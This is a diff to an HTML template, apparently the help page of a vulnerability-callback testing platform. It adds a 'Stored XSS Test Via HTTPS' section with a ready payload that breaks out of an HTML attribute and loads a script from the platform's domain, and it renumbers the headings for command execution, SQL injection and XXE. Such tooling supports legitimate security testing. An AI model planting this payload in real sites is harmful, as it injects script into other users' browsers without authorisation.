@@ -269,7 +269,21 @@
               <div class="card">
                   <div class="card-body">
                       <div class="card-header">
-                        一、命令执行场景
+                        Stored XSS Test Via HTTPS
+                      </div>
+                      <div class="card-body">
+                        <p class="card-text">
+                            If you want to test XSS via https url to get rid of <b>Mixed Content Warnings (HTTPS/SSL)</b>
+                        </p>
+                        <p class="card-text">
+                          <mark>
+                              /&gt; &lt;script src=&quot;https://{{ xss_test_domain }}/x/?u={{ username }}&quot;&gt;&lt;/script&gt;&lt;
+                          </mark>
+                        </p>
+                          <p class="card-text"> Check javascript source code <a href="https://{{ xss_test_domain }}/x/?u={{ username }}">https://{{ xss_test_domain }}/x/?u={{ username }}</a></p>
+                      </div>
+                      <div class="card-header">
+                        命令执行场景
                       </div>
                       <div class="card-body">
                         <p class="card-text">
@@ -286,7 +300,7 @@
                         </p>
                       </div>
                       <div class="card-header">
-                        二、SQL注入场景
+                        SQL注入场景
                       </div>
                       <div class="card-body">
                         <p class="card-text">
@@ -315,7 +329,7 @@
                         </p>
                       </div>
                       <div class="card-header">
-                        三、XXE场景
+                        XXE场景
                       </div>
                       <div class="card-body">
                         <p class="card-text">
@@ -326,7 +340,7 @@
                         </p>
                       </div>
                       <div class="card-header">
-                        四、其他场景
+                        其他场景
                       </div>
                       <div class="card-body">
                         <p class="card-text">
@@ -527,7 +541,7 @@
             } else {
                 $('#spinner_location').hide()
             }
-            
+
         });
 </script>
 
